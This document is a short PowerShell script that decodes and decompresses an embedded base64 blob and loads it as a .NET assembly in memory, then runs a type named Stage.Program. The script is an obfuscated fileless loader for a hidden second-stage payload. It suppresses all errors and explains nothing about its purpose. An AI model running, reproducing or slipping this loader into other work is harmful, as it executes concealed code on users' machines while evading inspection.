$ErrorActionPreference = 'SilentlyContinue'
function DecompressBuffer {
    param([byte[]]$data)
    $input = New-Object System.IO.MemoryStream(,$data)
    $output = New-Object System.IO.MemoryStream
    $dstream = New-Object System.IO.Compression.DeflateStream($input, [System.IO.Compression.CompressionMode]::Decompress)
    $buffer = New-Object byte[] 1024
    while (($read = $dstream.Read($buffer, 0, $buffer.Length)) -gt 0) { $output.Write($buffer, 0, $read) }
    return $output.ToArray()
}
$src  = "hACBOoP88B9YvdYIgQEFRf1P4VGr4NEmVotGV7iHFGPNJZ+Vv/fMhP16tVLF9xUCYnyHr3bWucMB3LKtfjyXmoTPiETNljcS/9LFHJ6IC5EOAKiR+GS6CUf0npWmulAHG4IAt4e0JVQh7qizSPknd2FMS/Uk5asb4a8+KRsH0EdQhCa8Z/OgwOaNrxOtzU3/2PF5od8dNN3oROZFTYCTH/VQkCixX6vwjw8yQxGOioIuTt6JSdxRpaLHG9YFqdtAypwnYkVFrga9GlOWLlLkmCtHQ8qSC8ahkGMrFlbdxBmn3FstD5qAtDoW0GB/+ZIBKtif6kynLH6VoQ66vTheJIwz/SGi/3MHdfrh3FR6F7Bi74u5UskXT47tS+2ima3g/w2mtevyu+gUcDWd"
$raw  = [Convert]::FromBase64String($src)
$asm  = DecompressBuffer -data $raw
$assembly = [System.Reflection.Assembly]::Load($asm)
$assembly.GetType("Stage.Program")::Main(@())
